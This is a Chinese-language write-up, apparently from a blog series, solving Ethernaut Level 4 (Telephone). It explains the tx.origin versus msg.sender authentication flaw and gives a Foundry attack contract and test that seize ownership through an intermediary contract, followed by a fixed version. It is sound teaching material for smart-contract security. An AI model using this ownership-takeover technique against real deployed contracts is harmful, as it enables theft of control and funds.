---
title: 'Ethernaut Level 4: Telephone - tx.origin vs msg.sender 身份验证绕过'
date: 2025-01-25 15:00:00
updated: 2025-01-25 15:00:00
categories:
  - Ethernaut 系列
  - 基础攻击篇 (1-10)
tags:
  - Ethernaut
  - Foundry
  - tx.origin
  - msg.sender
  - 身份验证绕过
  - 智能合约安全
  - Solidity
series: Ethernaut Foundry Solutions
excerpt: "深入理解 tx.origin 和 msg.sender 的区别，学习如何利用中间合约绕过身份验证机制。"
---

# 🎯 Ethernaut Level 4: Telephone - tx.origin vs msg.sender 身份验证绕过

> **关卡链接**: [Ethernaut Level 4 - Telephone](https://ethernaut.openzeppelin.com/level/4)  
> **攻击类型**: 身份验证绕过、中间合约攻击  
> **难度**: ⭐⭐☆☆☆

## 📋 挑战目标

1. **获取合约控制权** - 成为 `Telephone` 合约的 `owner`
2. **理解身份机制** - 掌握 `tx.origin` 和 `msg.sender` 的区别

## 🔍 漏洞分析

### 合约源码分析

```solidity
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        // 🚨 漏洞：使用 tx.origin 进行身份验证
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

### 关键概念对比

| 属性 | `msg.sender` | `tx.origin` |
|------|--------------|-------------|
| **定义** | 直接调用者 | 交易发起者 |
| **变化** | 每次调用都可能变化 | 整个交易链中不变 |
| **安全性** | ✅ 安全 | ❌ 危险 |
| **推荐使用** | 身份验证 | 仅用于日志记录 |

### 攻击原理

当我们通过中间合约调用时：
- `tx.origin` = 用户地址 (交易发起者)
- `msg.sender` = 攻击合约地址 (直接调用者)
- 由于 `tx.origin != msg.sender`，条件满足，可以修改 owner

## 💻 Foundry 实现

### 攻击合约代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Telephone.sol";

contract TelephoneAttacker {
    Telephone public target;
    
    constructor(address _target) {
        target = Telephone(_target);
    }
    
    function attack(address _newOwner) public {
        // 通过中间合约调用，使 tx.origin ≠ msg.sender
        target.changeOwner(_newOwner);
    }
}

contract TelephoneTest is Test {
    Telephone public telephone;
    TelephoneAttacker public attacker;
    
    address public user = makeAddr("user");
    address public newOwner = makeAddr("newOwner");

    function setUp() public {
        telephone = new Telephone();
        attacker = new TelephoneAttacker(address(telephone));
    }

    function testTelephoneExploit() public {
        vm.startPrank(user);
        
        // 通过中间合约攻击
        attacker.attack(newOwner);
        
        vm.stopPrank();
        
        // 验证攻击成功
        assertEq(telephone.owner(), newOwner);
        console.log("Attack successful! New owner:", telephone.owner());
    }
}
```

## 🛡️ 防御措施

### 使用 msg.sender 进行身份验证

```solidity
contract SecureTelephone {
    address public owner;
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }
    
    function changeOwner(address _newOwner) public onlyOwner {
        owner = _newOwner;
    }
}
```

## 🎯 总结

Telephone 关卡教导我们：
- ✅ 永远不要使用 `tx.origin` 进行身份验证
- ✅ 使用 `msg.sender` 进行安全的身份检查
- ✅ 理解调用链中的身份传递机制

---

## 🔗 相关链接

- **[上一关: Level 3 - Coin Flip](/2025/01/25/ethernaut-level-03-coinflip/)**
- **[下一关: Level 5 - Token](/2025/01/25/ethernaut-level-05-token/)**
- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**
- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**